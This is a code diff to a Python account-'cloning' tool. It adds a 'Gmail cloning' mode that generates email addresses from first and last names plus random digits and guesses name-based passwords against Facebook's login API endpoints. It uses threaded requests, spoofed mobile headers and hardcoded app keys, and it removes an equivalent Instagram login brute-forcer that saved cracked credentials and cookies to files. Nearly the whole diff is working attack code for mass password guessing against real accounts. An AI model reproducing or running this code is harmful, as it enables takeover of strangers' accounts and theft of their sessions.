@@ -568,7 +568,7 @@ def menu():
     print("[1] FILE   CLONING =>")
     print("[2] RANDOM CLONING =>")
     print("[3] PUBLIK CLONING =>")
-    print("[4] INSGRAM CLONING =>")
+    print("[4] GMAIL  CLONING =>")
     print("[5] CONTACT (WHATSAPP) ")
     print("[6] EXIT TOOL ")
     linex()
@@ -576,7 +576,7 @@ def menu():
     if bithi =='1':f_clone()
     elif bithi =='2':r_clone()
     elif bithi =='3':n_clone()
-    elif bithi =='4':random_number()
+    elif bithi =='4':g_clone()
     elif bithi =='5':os.system("xdg-open ");menu()
     elif bithi =='6':exit()
     else:
@@ -1042,42 +1042,69 @@ def n_clone():
     divider()
     exit()
 
-def random_number():
-    clear()
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
-    linex()
-    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
+def g_clone():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print(" Ex First : ayesha, kazim, SUMON ")
+    print(" Ex Last  : rajput, channa, aaraya ")
+    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    first = input(' [â¢] First Name : ')
+    last = input(' [â¢] Last Name  : ')
+    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    print(' Ex Domain : @gmail.com, @yahoo.com, @hotmail.com ')
+    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    domain = input(' [â¢] Domain : ')
     try:
-        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
+        limit = int(input(' [â¢] Crack Limit : '))
     except ValueError:
         limit = 5000
-    for _ in range(limit):
-        x = "".join(random.choice(string.digits) for _ in range(6))
-        idz.append(x)
-    with ThreadPoolExecutor(max_workers=30) as XYZ:
-        clear()
-        total_idz = str(len(idz))
-        print(f"\033[1;96m KING IS ALWAYS KING")
-        print(f"\033[1;96m SOME RESPECT")
-        linex()
-        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
-        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
-        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
-        linex()
-        for xyz in idz:
-            uid = code+xyz
-            pww = ['57273200',uid[:6],uid[:8],uid] 
-         #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
-            XYZ.submit(crack, uid, pww, total_idz)
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    clear()
+    print("                CHOOSE METHOD                       ")
+    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    print(" [1] METHOD (METHOD1) ")
+    print(" [2] METHOD (METHOD2) ")
+    print(" [3] METHOD (METHOD3) ")
+    print(" [4] METHOD (METHOD4) ")
+    print(" [5] METHOD (METHOD5) ")
+    print(" [6] METHOD (METHOD6) ")
     linex()
-    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
+    SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
-    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
-    menu()
-
+    print(" [?] Do You Want To Show Cookies : (Y/N) ")
+    linex()
+    c = input(" [?] Input : ")
+    if c in ["Y", "y"]:
+        cookie_show.append("yes")
+    else:
+        cookie_show.append("no")
+    with ThreadPool(max_workers=30) as SUMON_xd:
+        tl = str(len(user))
+        os.system("clear")
+        print(logo)
+        print(' [â¢] CRACKING STARTED ')
+        print(' [â¢] TOTAL ACCOUNT : \033[1;32m'+tl)
+        print(' [!] USE FLIGHT MODE FOR MORE IDZ ')
+        print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        for love in user:
+            uid = first+'.'+last+'.'+love+domain
+            pwx = [first+last,first+' '+last,first+last+'12',last,first+love,first+'123',first+'1234',first+last+'12']
+            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
+            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
+            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
+            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
+            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
+            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
+            else:
+                SUMON_xd.submit(p,uid,pwx,tl)
+    linex()
+    print('[â] CRACK PROCESS COMPLETE')
+    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
+    print('[â] ID SAVE SUMON-OK TXT')
+    linex()
 
 def freefb(uid, name, pwx, tl):
     global loop
@@ -1397,7 +1424,7 @@ def mbasic(uid,pwx,tl):
             'X-Fb-Server-Cluster': 'True',
             'Content-Length': '27'}
             url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers, allow_redirects=False).json()
+            result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
@@ -1471,27 +1498,23 @@ def p(uid,pwx,tl):
             'api_key': '882a8490361da98702bf97a021ddc14d',
             'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
             headers = {
-            'user-agent': '[FBAN/FB4A;FBAV/54.0.0.4363;FBBV/12590258;Dalvik/2.1.0(Linux; U; Android 8.0;P40 Pro Build/9Q0WGK1S)[FBAN/FB4A;FBAV/108.0.0.84.89FBBV/8018955FBDM/{density=3.0,width=715,height=930}FBLC/fr_FRFBRV/1539581FBCR/SprintFBMF/HuaweiFBBD/HuaweiFBPN/com.facebook.katanaFBDV/P40 ProFBSV/8.0FBOP/1FBCA/x86:armeabi-v7a]Dalvik/2.1.0(Linux; U; Android 5.0;CPH2171 Build/QGEO88G4)[FBAN/FB4A;FBAV/92.0.0.52.44FBBV/1035009FBDM/{density=3.0,width=454,height=1644}FBLC/pt_BRFBRV/5535503FBCR/OrangeFBMF/OPPOFBBD/OPPOFBPN/com.facebook.katanaFBDV/CPH2171FBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]',
-            'accept-encoding': 'gzip, deflate',
+            'Host': 'graph.facebook.com',
+            'User-Agent': UA(),
+            'Accept-Encoding': 'gzip, deflate',
             'Accept': '*/*',
             'Connection': 'keep-alive',
-            'content-type': 'application/x-www-form-urlencoded',
-            'Host': 'graph.facebook.com',
-            'x-fb-sim-hni': '44501',
-            'X-FB-Connection-Type': 'MOBILE.LTE',
             'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'x-fb-net-hni': '44085',
-            'x-fb-device-group': '5120',
-            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-            'x-fb-connection-bandwidth': '413859',
-            'x-fb-connection-quality': 'EXCELLENT',
+            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
+            'X-FB-Net-HNI': str(random.randint(20000,40000)),
+            'X-FB-Connection-Bandwidth': '27181576',
+            'X-FB-Connection-Quality': 'EXCELLENT',
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-FB-HTTP-Engine': 'Liger',
             'X-FB-Client-IP': 'True',
-            'X-FB-Server-Cluster': 'True',
-            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-            'x-fb-friendly-name': 'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags': 'graphservice',
-            'x-fb-http-engine': 'Liger'}
-            url = "https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
+            'X-FB-Friendly-Name': 'authenticate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': '1026'}
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
@@ -1561,24 +1584,27 @@ def x(uid,pwx,tl):
             'fb_api_req_friendly_name': 'authenticate',
             'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers = {
-"x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 
-"x-fb-ta-logging-ids": f"graphql:{str(uuid.uuid4())}",
-"content-type": "application/x-www-form-urlencoded",
-"x-fb-connection-type": "WIFI",
-"x-fb-background-state": "1",
-"x-graphql-request-purpose": "fetch",
-"user-agent": UA(),
-"authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
-"x-graphql-client-library": "graphservice",
-"x-fb-privacy-context": "3643298472347298",
-"x-fb-device-group": "3273",
-"x-tigon-is-retry": "False",
-"priority": "u=3,i",
-"accept-encoding": "gzip, deflate",
-"x-fb-http-engine": "Liger",
-"x-fb-client-ip": "True",
-"x-fb-server-cluster": "True"}
+            'Host': 'graph.facebook.com',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Priority': 'u=3, i',
+            'X-Fb-Sim-Hni': str(random.randint(20000,40000)),
+            'X-Fb-Net-Hni': str(random.randint(20000,40000)),
+            'X-Fb-Connection-Quality': 'GOOD',
+            'Zero-Rated': '0',
+            'User-Agent': UA(),
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-Fb-Connection-Bandwidth': '24807555',
+            'X-Fb-Connection-Type': 'MOBILE.LTE',
+            'X-Fb-Device-Group': '5120',
+            'X-Tigon-Is-Retry': 'False',
+            'X-Fb-Friendly-Name': 'authenticate',
+            'X-Fb-Request-Analytics-Tags': 'unknown',
+            'X-Fb-Http-Engine': 'Liger',
+            'X-Fb-Client-Ip': 'True',
+            'X-Fb-Server-Cluster': 'True',
+            'Content-Length': '847'}
             url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
@@ -1623,68 +1649,45 @@ def mobile(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            data = {
-            "email": uid,
-            "password": pw,
-            "method": "post",
-            "pretty": "false",
-            "format": "json",
-            "server_timestamps": "true",
-            "locale": "en_US",
-            "purpose": "fetch",
-            "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
-            "fb_api_caller_class": "graphservice",
-            "client_doc_id": str(random.randint(111111111111111111111111111111,999999999999999999999999999999)),
-            "lois_settings": "lois_token",
-            "lara_override": "server_params",
-            "is_from_logged_out": "0",
-            "layered_homepage_experiment_group": "null",
-            "device_id": str(uuid.uuid4()),
-            "waterfall_id": str(uuid.uuid4()),
-            "INTERNAL__latency_qpl_instance_id": "71821365400215",
-            "is_platform_login": "0",
-            "header_transparency_event_location": "login",
-            "INTERNAL__latency_qpl_marker_id": str(random.randint(11111111,99999999)),
-            "family_device_id": str(uuid.uuid4()),
-            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
-            "INTERNAL_INFRA_THEME": "harm_f",
-            "headers_flow_id": str(uuid.uuid4()),
-            "transparency_event_type": "affirmative_action",
-            "header_transparency_event_name": "login_button_clicked",
-            "is_from_logged_in_switcher": "0",
-            "bloks_versioning_id": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
-            "app_id": "com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
-            "scale": "2",
-            "styles_id": "e6c6f61b7a86cdf3fa2eaaffa982fbd1",
-            "using_white_navbar": "True",
-            "pixel_ratio": "2",
-            "is_push_on": "True",
-            "bloks_version": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
-            "fb_api_analytics_tags": '["GraphServices"]',
-            "client_trace_id": str(uuid.uuid4()),
-            "generate_session_cookies": "1",
-            "generate_analytics_claim": "1",
-            "error_detail_type": "button_with_disabled"}
-            headers =  {
-            "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 
-            "x-fb-ta-logging-ids": f"graphql:{str(uuid.uuid4())}",
-            "content-type": "application/x-www-form-urlencoded",
-            "x-fb-connection-type": "WIFI",
-            "x-fb-background-state": "1",
-            "x-graphql-request-purpose": "fetch",
-            "user-agent": UA(),
-            "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-            "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
-            "x-graphql-client-library": "graphservice",
-            "x-fb-privacy-context": "3643298472347298",
-            "x-fb-device-group": "3273",
-            "x-tigon-is-retry": "False",
-            "priority": "u=3,i",
-            "accept-encoding": "gzip, deflate",
-            "x-fb-http-engine": "Liger",
-            "x-fb-client-ip": "True",
-            "x-fb-server-cluster": "True"}
-            url = "https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
+            data =  {
+            'adid': str(uuid.uuid4()),
+            'format': 'json',
+            'device_id': str(uuid.uuid4()),
+            'cpl': 'true',
+            'family_device_id': str(uuid.uuid4()),
+            'credentials_type': 'device_based_login_password',
+            'error_detail_type': 'button_with_disabled',
+            'source': 'device_based_login',
+            'email': uid,
+            'password': pw,
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'generate_session_cookies': '1',
+            'meta_inf_fbmeta': '',
+            'advertiser_id': str(uuid.uuid4()),
+            'currently_logged_in_userid': '0',
+            'locale': 'en_US',
+            'client_country_code': 'US',
+            'method': 'auth.login',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4AuthHandler',
+            'api_key': '882a8490361da98702bf97a021ddc14d'}
+            headers = {
+            'User-Agent': 'FBAN/FB4A; FBAV/13.0.0.7947; FBBV/2722729; [FBAN/ FB4A; FBAV/346.0.0.29.119; FBBV/335950287; FBDM/{density=2.625, width=1080, height=1920}; FBLC/en_GB; FBRV/337277111; FBCR/Null; FBMF/Coolpad; FBBD/Coolpad; FBPN/com.facebook.katana; FBDV/C1-U02; FBSV/6.0.1; FBOP/1; FBCA/armeabi-v7a: armeabi;]',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'X-FB-Net-HNI': '24632',
+            'X-FB-SIM-HNI': '31641',
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-Tigon-Is-Retry': 'False',
+            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main; tid=132;nc=1; fc=0; bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'x-fb-device-group': '5120',
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+            url = "https://api.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
@@ -2180,94 +2183,6 @@ def cracker(uid, pwx, tl):
         time.sleep(20)
     except Exception as error:
         #print({error})
-        pass
-
-def crack(uid, pww, total_idz):
-    global loop
-    global oks
-    global cps
-    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
-    sys.stdout.flush()
-    try:
-        for pw in pww:
-            session = requests.Session()
-            time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
-            response = session.get('https://www.instagram.com/accounts/login/')
-            csrftoken = response.cookies.get('csrftoken')
-            cookies ={
-                'csrftoken': csrftoken,
-                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
-                'ig_nrcb': '1',
-                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
-                'ps_l': '1',
-                'ps_n': '1',
-                'wd': '885x773',}
-            data = {
-                "enc_password": enc_password,
-                'optIntoOneTap': 'false',
-                'queryParams': '{"hl":"en"}',
-                'trustedDeviceRecords': '{}',
-                'username': uid,}
-            headers = {
-                'authority': 'www.instagram.com',
-                'accept': '*/*',
-                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
-                'content-type': 'application/x-www-form-urlencoded',
-                # 'cookie': 'csrftoken=4M2PbXXQYNEmDdxrQg01NL; mid=ZsCYoAALAAGlcbYkVN23DYxQwevD; ig_did=E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B; ig_nrcb=1; datr=npjAZqX5wY3c_CtTDAvR0Ls3; ps_l=1; ps_n=1; wd=885x773',
-                'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '""',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-ch-ua-platform-version': '"10.0.0"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
-                'x-asbd-id': '129477',
-                'x-csrftoken': csrftoken,
-                'x-ig-app-id': '936619743392459',
-                'x-ig-www-claim': '0',
-                'x-instagram-ajax': '1015820104',
-                'x-requested-with': 'XMLHttpRequest',}
-            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
-            session_cookies = response.cookies.get_dict()
-            if response.status_code == 200:
-                json_response = response.json()
-                if json_response.get('status') == 'ok':
-                   if json_response.get('authenticated') == True:
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        return True
-                   elif json_response.get('auth_token'):
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        return True
-                   elif 'sessionid' in session_cookies:
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        return True
-            else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
-                continue
-        loop+=1
-    except ConnectionError:
-        time.sleep(10)
-    except:
         pass
 
 os.system("clear")
